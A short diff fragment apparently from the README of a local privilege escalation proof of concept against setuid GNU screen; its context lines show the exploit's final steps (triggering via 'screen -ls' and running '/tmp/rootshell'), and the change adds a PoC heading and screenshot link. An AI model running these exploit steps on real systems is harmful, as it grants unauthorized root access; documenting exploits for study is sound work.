@@ -73,3 +73,6 @@ echo "[+] Triggering..."
 screen -ls # screen itself is setuid, so...
 /tmp/rootshell
 ```
+
+# PoC
+![Proof of Concept](PoC-Vulnerable-Services.png)
